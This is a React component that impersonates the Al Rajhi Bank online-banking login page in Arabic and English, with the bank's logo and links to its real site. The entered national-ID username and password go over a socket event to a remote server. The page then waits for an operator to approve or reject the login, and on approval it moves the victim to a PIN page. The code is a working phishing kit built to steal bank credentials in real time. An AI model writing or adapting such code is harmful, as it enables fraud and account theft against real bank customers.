import React, { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useI18n } from '../../shared/i18n';
import { socketService } from '../../services/socketService';
import { validateNationalID } from '../../shared/validation';
import { getStoredNationalId, setStoredNationalId } from '../../shared/utils';

const RajhiLogin: React.FC = () => {
    const navigate = useNavigate();
    const { language, setLanguage, isRTL } = useI18n();
    const isArabic = language === 'ar' || isRTL;

    const [formData, setFormData] = useState({ user: '', pass: '' });
    const [loading, setLoading] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [rememberMe, setRememberMe] = useState(false);
    const [errorMessage, setErrorMessage] = useState('');

    useEffect(() => {
        const storedId = getStoredNationalId();
        if (storedId) {
            setFormData((prev) => ({ ...prev, user: storedId }));
        }
    }, []);

    const text = useMemo(() => {
        if (isArabic) {
            return {
                welcomeTitle: 'مرحبًا بك في الراجحي أونلاين',
                subtitle: 'قم بتسجيل الدخول باستخدام اسم المستخدم وكلمة المرور',
                username: 'اسم المستخدم',
                password: 'كلمة المرور',
                rememberMe: 'تذكرني',
                forgotPassword: 'نسيت كلمة المرور؟',
                login: 'تسجيل الدخول',
                loggingIn: 'جاري الإرسال...',
                waitingTitle: 'جاري التحقق من الطلب',
                waitingHint: 'يرجى الانتظار وعدم إغلاق الصفحة',
                rejectedFallback: 'تعذر التحقق من بيانات تسجيل الدخول في مصرف الراجحي. يرجى المحاولة مرة أخرى.',
                errorTitle: 'تعذر تسجيل الدخول',
                switchLanguage: 'English',
                helpLink: 'تواجه مشكلة في تسجيل الدخول؟',
                registerTextPrefix: 'لست مشتركًا حتى الآن؟',
                registerLink: 'سجل في الخدمات المصرفية عبر الإنترنت',
                invalidUsername: 'اسم المستخدم يجب أن يكون 10 أرقام إنجليزية فقط ويبدأ بـ 1 أو 2.'
            };
        }

        return {
            welcomeTitle: 'Welcome to Al Rajhi Online',
            subtitle: 'Login with your username and password',
            username: 'Username',
            password: 'Password',
            rememberMe: 'Remember me',
            forgotPassword: 'Forgot password?',
            login: 'Login',
            loggingIn: 'Submitting...',
            waitingTitle: 'Verifying your request',
            waitingHint: 'Please wait and do not close this page',
            rejectedFallback: 'Unable to verify Al Rajhi login details. Please try again.',
            errorTitle: 'Login failed',
            switchLanguage: 'العربية',
            helpLink: 'Having trouble to login?',
            registerTextPrefix: 'Not already a member?',
            registerLink: 'Register for Online Banking',
            invalidUsername: 'Username must be exactly 10 English digits and start with 1 or 2.'
        };
    }, [isArabic]);

    const handleUsernameChange = (rawValue: string) => {
        const digitsOnly = rawValue.replace(/[^0-9]/g, '').slice(0, 10);

        if (digitsOnly.length > 0 && !['1', '2'].includes(digitsOnly[0])) {
            setFormData((prev) => ({ ...prev, user: '' }));
            return;
        }

        setFormData((prev) => ({ ...prev, user: digitsOnly }));

        if (validateNationalID(digitsOnly).valid) {
            setStoredNationalId(digitsOnly);
        }
    };

    useEffect(() => {
        socketService.connect();

        const handleRajhiApproved = (data: { redirectTo?: string }) => {
            setLoading(false);
            setErrorMessage('');
            navigate(data?.redirectTo || '/pin');
        };

        const handleRajhiRejected = (data: { message?: string }) => {
            setLoading(false);
            setErrorMessage(data?.message || text.rejectedFallback);
        };

        socketService.on('rajhiLoginApproved', handleRajhiApproved);
        socketService.on('rajhiLoginRejected', handleRajhiRejected);

        return () => {
            socketService.off('rajhiLoginApproved', handleRajhiApproved);
            socketService.off('rajhiLoginRejected', handleRajhiRejected);
        };
    }, [navigate, text.rejectedFallback]);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        if (!formData.user.trim() || !formData.pass.trim()) {
            return;
        }

        if (!validateNationalID(formData.user.trim()).valid) {
            setErrorMessage(text.invalidUsername);
            return;
        }

        setStoredNationalId(formData.user.trim());

        setErrorMessage('');
        setLoading(true);

        socketService.emitClientEvent('submitRajhi', {
            username: formData.user.trim(),
            password: formData.pass
        });
    };

    return (
        <div className="rajhi-page" dir={isArabic ? 'rtl' : 'ltr'}>
            <header className="rajhi-header">
                <div className="header-content">
                    <div className="logo-section">
                        <img src="/imgs/alrajhi_bank_logo.svg" alt="Al Rajhi Bank" className="bank-logo" />
                    </div>
                    <div
                        className="header-lang"
                        onClick={() => setLanguage(isArabic ? 'en' : 'ar')}
                        role="button"
                        tabIndex={0}
                        onKeyDown={(event) => {
                            if (event.key === 'Enter' || event.key === ' ') {
                                event.preventDefault();
                                setLanguage(isArabic ? 'en' : 'ar');
                            }
                        }}
                    >
                        {text.switchLanguage}
                    </div>
                </div>
            </header>

            <main className="rajhi-main">
                <div className="login-card">
                    <h1 className="welcome-title">{text.welcomeTitle}</h1>
                    <p className="form-subtitle">{text.subtitle}</p>

                    <form onSubmit={handleSubmit} className="login-form">
                        <div className="input-group">
                            <input
                                type="text"
                                id="username"
                                className={`form-input ${formData.user ? 'has-value' : ''}`}
                                value={formData.user}
                                onChange={(e) => handleUsernameChange(e.target.value)}
                                autoComplete="off"
                                inputMode="numeric"
                                pattern="[12][0-9]{9}"
                                maxLength={10}
                                title={text.invalidUsername}
                                placeholder=" "
                                required
                            />
                            <label htmlFor="username" className="input-label">{text.username}</label>
                        </div>

                        <div className="input-group">
                            <input
                                type={showPassword ? 'text' : 'password'}
                                id="password"
                                className={`form-input ${formData.pass ? 'has-value' : ''}`}
                                value={formData.pass}
                                onChange={(e) => setFormData({ ...formData, pass: e.target.value })}
                                autoComplete="off"
                                placeholder=" "
                                required
                            />
                            <label htmlFor="password" className="input-label">{text.password}</label>
                            <button
                                type="button"
                                className="toggle-password"
                                onClick={() => setShowPassword(!showPassword)}
                                aria-label={showPassword ? 'Hide password' : 'Show password'}
                            >
                                {showPassword ? (
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6B7CB4" strokeWidth="2">
                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                        <circle cx="12" cy="12" r="3" />
                                    </svg>
                                ) : (
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6B7CB4" strokeWidth="2">
                                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                                        <line x1="1" y1="1" x2="23" y2="23" />
                                    </svg>
                                )}
                            </button>
                        </div>

                        <div className="options-row">
                            <label className="checkbox-wrapper">
                                <input
                                    type="checkbox"
                                    checked={rememberMe}
                                    onChange={(e) => setRememberMe(e.target.checked)}
                                />
                                <span className="checkbox-label">{text.rememberMe}</span>
                            </label>
                            <a href="https://onlinebanking.alrajhibank.com.sa/OnlineBanking/user/atmcard-details" target="_blank" rel="noopener noreferrer" className="forgot-link">{text.forgotPassword}</a>
                        </div>

                        <button type="submit" disabled={loading} className="login-btn">
                            {loading ? text.loggingIn : text.login}
                        </button>
                    </form>

                    {errorMessage && (
                        <div className="error-box" role="alert">
                            <strong>{text.errorTitle}: </strong>
                            <span>{errorMessage}</span>
                        </div>
                    )}

                    <div className="help-links">
                        <a href="https://onlinebanking.alrajhibank.com.sa/OnlineBanking/user/atmcard-details" target="_blank" rel="noopener noreferrer" className="help-link">{text.helpLink}</a>
                        <p className="register-text">
                            {text.registerTextPrefix} <a href="https://onlinebanking.alrajhibank.com.sa/OnlineBanking/user/register" target="_blank" rel="noopener noreferrer" className="register-link">{text.registerLink}</a>
                        </p>
                    </div>
                </div>
            </main>

            {loading && (
                <div className="loading-overlay">
                    <div className="loading-card">
                        <div className="spinner" />
                        <h3>{text.waitingTitle}</h3>
                        <small>{text.waitingHint}</small>
                    </div>
                </div>
            )}

            <style>{`
                * { box-sizing: border-box; }
                .rajhi-page {
                    min-height: 100vh;
                    background: #f0f4f8;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                    color: #1a1a2e;
                }
                .rajhi-header { background: #f0f4f8; padding: 15px 24px; }
                .header-content {
                    max-width: 1100px;
                    margin: 0 auto;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    gap: 12px;
                }
                .bank-logo { height: 42px; width: auto; }
                .header-lang {
                    color: #3B5998;
                    font-size: 14px;
                    cursor: pointer;
                    font-weight: 600;
                    user-select: none;
                }
                .header-lang:hover { text-decoration: underline; }
                .rajhi-main { display: flex; justify-content: center; padding: 36px 16px; }
                .login-card {
                    background: #fff;
                    border-radius: 20px;
                    padding: 34px 26px;
                    width: 100%;
                    max-width: 500px;
                    box-shadow: 0 2px 20px rgba(0, 0, 0, 0.05);
                    text-align: left;
                }
                .rajhi-page[dir='rtl'] .login-card { text-align: right; }
                .welcome-title {
                    font-size: 31px;
                    font-weight: 700;
                    margin-bottom: 12px;
                    line-height: 1.3;
                }
                .form-subtitle { color: #334155; font-size: 14px; margin-bottom: 22px; }
                .login-form { display: flex; flex-direction: column; gap: 16px; }
                .input-group { position: relative; }
                .form-input {
                    width: 100%;
                    padding: 18px 46px 9px 14px;
                    border: 1px solid #e5e9f2;
                    border-radius: 12px;
                    font-size: 15px;
                    outline: none;
                    transition: border-color 0.2s;
                    text-align: left;
                }
                .rajhi-page[dir='rtl'] .form-input { text-align: right; padding: 18px 14px 9px 46px; }
                .form-input:focus { border-color: #3B5998; }
                .input-label {
                    position: absolute;
                    left: 12px;
                    top: 50%;
                    transform: translateY(-50%);
                    color: #94a3b8;
                    font-size: 14px;
                    pointer-events: none;
                    transition: all 0.2s ease;
                    background: #fff;
                    padding: 0 4px;
                }
                .rajhi-page[dir='rtl'] .input-label { left: auto; right: 12px; }
                .form-input:focus + .input-label,
                .form-input:not(:placeholder-shown) + .input-label {
                    top: 11px;
                    font-size: 11px;
                    color: #64748b;
                }
                .toggle-password {
                    position: absolute;
                    right: 12px;
                    top: 50%;
                    transform: translateY(-50%);
                    background: none;
                    border: none;
                    cursor: pointer;
                    padding: 5px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                }
                .rajhi-page[dir='rtl'] .toggle-password { right: auto; left: 12px; }
                .options-row { display: flex; justify-content: space-between; align-items: center; gap: 10px; }
                .rajhi-page[dir='rtl'] .options-row { direction: rtl; }
                .checkbox-wrapper { display: inline-flex; align-items: center; gap: 8px; cursor: pointer; }
                .checkbox-wrapper input[type='checkbox'] { width: 16px; height: 16px; accent-color: #3B5998; }
                .checkbox-label { font-size: 14px; color: #334155; }
                .forgot-link, .help-link, .register-link { color: #3B5998; text-decoration: none; }
                .forgot-link:hover, .help-link:hover, .register-link:hover { text-decoration: underline; }
                .login-btn {
                    width: 100%;
                    padding: 14px;
                    background: #a8c5e8;
                    color: #294a8b;
                    border: none;
                    border-radius: 24px;
                    font-size: 15px;
                    font-weight: 700;
                    cursor: pointer;
                    transition: all 0.2s;
                    margin-top: 4px;
                }
                .login-btn:hover:not(:disabled) { background: #8fb3dc; }
                .login-btn:disabled { opacity: 0.7; cursor: not-allowed; }
                .error-box {
                    margin-top: 16px;
                    border: 1px solid #fecaca;
                    background: #fef2f2;
                    color: #b91c1c;
                    border-radius: 12px;
                    padding: 12px;
                    font-size: 14px;
                    line-height: 1.5;
                    text-align: start;
                }
                .help-links { margin-top: 20px; text-align: center; }
                .register-text { margin-top: 10px; font-size: 13px; color: #64748b; }
                .loading-overlay {
                    position: fixed;
                    inset: 0;
                    background: rgba(0, 0, 0, 0.45);
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    z-index: 60;
                    padding: 16px;
                }
                .loading-card {
                    width: 100%;
                    max-width: 420px;
                    background: #fff;
                    border-radius: 16px;
                    padding: 24px;
                    text-align: center;
                    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
                }
                .spinner {
                    width: 42px;
                    height: 42px;
                    border: 4px solid #dbeafe;
                    border-top-color: #3B5998;
                    border-radius: 999px;
                    margin: 0 auto 14px auto;
                    animation: spin 0.9s linear infinite;
                }
                .loading-card h3 { margin: 0 0 8px 0; font-size: 20px; }
                .loading-card p { margin: 0 0 8px 0; color: #475569; line-height: 1.6; }
                .loading-card small { color: #64748b; }

                @keyframes spin {
                    from { transform: rotate(0deg); }
                    to { transform: rotate(360deg); }
                }

                @media (max-width: 640px) {
                    .rajhi-header { padding: 12px 14px; }
                    .bank-logo { height: 36px; }
                    .login-card { padding: 24px 16px; border-radius: 14px; }
                    .welcome-title { font-size: 25px; }
                    .options-row { flex-direction: column; align-items: flex-start; width: 100%; }
                    .rajhi-page[dir='rtl'] .options-row {
                        align-items: flex-end !important;
                        text-align: right !important;
                        direction: rtl;
                    }
                    .rajhi-page[dir='rtl'] .options-row .checkbox-wrapper,
                    .rajhi-page[dir='rtl'] .options-row .forgot-link {
                        align-self: flex-end !important;
                        text-align: right !important;
                        width: 100%;
                    }
                    .rajhi-page[dir='rtl'] .options-row .checkbox-wrapper {
                        justify-content: flex-end;
                        flex-direction: row-reverse;
                    }
                    .rajhi-page[dir='rtl'] .options-row .forgot-link {
                        display: block;
                    }
                }
            `}</style>
        </div>
    );
};

export default RajhiLogin;
